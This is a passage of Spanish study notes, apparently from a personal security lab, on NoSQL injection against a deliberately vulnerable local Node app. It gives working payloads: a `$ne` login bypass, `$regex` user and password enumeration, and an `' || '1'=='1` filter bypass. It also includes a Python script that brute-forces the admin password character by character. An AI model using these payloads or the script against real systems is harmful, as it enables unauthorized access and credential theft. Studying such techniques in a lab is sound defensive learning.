> Las bases de datos NoSQL son sistemas de almacenamiento de datos diseñados con el objetivo de manejar grandes volúmenes de información no estructurada (o semiestructurada), a diferencia de la información que manejan las bases de datos relacionales del modelo tradicional (SQL o Structured Query Language).

- Una inyección de tipo NoSQL, ocurre cuando un atacante manipula consultas de tipo NoSQL, aprovechándose de una incorrecta validación de las entradas o parámetros de usuario, permitiendo así la ejecución de sentencias no deseadas, diferentes a las específicas para las que se ha creado la funcionalidad explotada.

## Laboratorio
- [[vulnerable-node-app]]

## Enumeracion de usuarios
- En la pagina de `lookup` hay una forma de ver a todos los usuarios
	- De forma analoga al `' or 1=1 --` de sqli
	- `' || '1'=='1` y por verdadero muestra todos los usuarios


## Acceso sin contrasenia
- En la pagina de `login` al interceptar la peticion y cambiar por 
```
{
	"username":"admin",
	"password":{
		"$ne":"hola"
	}
}
```
- Donde le decimos al servidor que la contrasenia no es igual `$ne` (not equal) y entonces ponemos una contrasenia cualquiera y como es verdad que no es la contrasenia nos deja pasar.

## Enumeracion de usuarios mediante login
```
{
	"username":{
		"$regex": "^a" 
	},
	"password":{
		"$ne":"hola"
	}
}
```
- Con la etique regex lo que hacemos es matchear el comienzo del nombre de un usuario y el servidor lo completa mostrandonos en la respuesta el nombre completo del usuario.
- Si hubiese varios usuarios con el nombre iniciando en a, habria que ir descubriendo el segundo caracter.

## Descubrimiendo de contrasenias
```
{
	"username":"admin",
	"password":{
		"$regex":"^2"
	}
}
```
- Utilizando regex en la contrasenia podemos ir caracter por caracter ayudandonos de la respuesta del servidor descubrirla completa.
```
{
	"username":"admin",
	"password":{
		"$regex":".{24}"
	}
}
```
- De esta otra forma podemos ver cuantos caracteres tiene la contrasenia, cuando demos en el numero nos logramos loguear igualmente.

```python
import requests, string, signal, sys
from pwn import *

def handler(sig, frame):
    print("\n\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, handler)


url = "http://localhost:4000/user/login"
characters = string.printable

def nosqli():
    passwd = ""
    p1 = log.progress("Iniciando fuerza bruta")
    p2 = log.progress("Contraseña")

    for i in range(50):
        for char in characters:
            data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (passwd, char)
            p1.status(data)
            headers = {'Content-Type':'application/json'}
            r = requests.post(url, headers=headers,data=data)

            if 'Logged in as user' in r.text:
                passwd += char
                p2.status(passwd)
                break

            if char == '$' and 'Logged in as user' not in r.text:
                sys.exit(0)


nosqli()
```
- con barras de progreso y todo

## Descrubrimiento total
- En la pagina de `lookup` podemos interceptar la busqueda de un usuario y convertir esa peticion GET a POST y al buscar el usuario `admin` vemos todos sus datos, contrasenias, etc.
- Para ver los datos de todos los usuarios esa misma peticion POST igualamos
`username='+||'1'=='1`

